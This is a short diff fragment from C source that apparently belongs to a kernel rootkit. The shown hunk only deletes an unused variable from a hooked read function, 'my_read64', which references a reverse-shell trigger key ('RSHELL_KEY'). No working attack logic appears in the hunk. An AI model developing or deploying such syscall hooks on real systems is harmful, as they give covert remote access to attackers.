@@ -22,7 +22,6 @@ asmlinkage int my_read64(int fd, void *buf, size_t len) {
 	struct sk_buff *sk_buff = NULL;
 	char my_buf[sizeof(RSHELL_KEY)];
 	struct file *file = NULL;
-	bool is_socket = false;
 
 	file = f_fget(fd);
 	if (file) {
